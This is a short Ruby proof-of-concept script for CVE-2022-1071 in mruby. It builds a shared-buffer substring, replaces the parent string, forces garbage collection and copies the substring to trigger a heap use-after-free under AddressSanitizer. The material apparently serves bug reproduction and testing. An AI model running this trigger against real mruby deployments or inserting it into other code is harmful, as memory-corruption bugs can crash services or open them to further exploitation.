# Minimal PoC for CVE-2022-1071 in mruby.
# This script is crafted to trigger a deterministic heap-use-after-free in __asan_memcpy
# during mrb_vm_exec in an ASan-enabled build of mruby.

# The PoC creates a substring that shares an internal buffer with its parent string.
# Then the original string is replaced, potentially freeing the shared buffer.
# Forcing garbage collection and a volatile operation on the substring should trigger
# a use-after-free crash via a memcpy in the VM execution.

def trigger
  s = "A" * 64            # Allocate a string of fixed size
  a = s[0, 32]              # Create a substring that may share internal storage
  s.replace("B" * 64)      # Replace original string, potentially freeing shared buffer
  1000.times { GC.start }      # Force garbage collection multiple times
  a.concat(a)             # Concatenate substring to force memory copy
  a[0]                      # Access to trigger the UAF
end

trigger
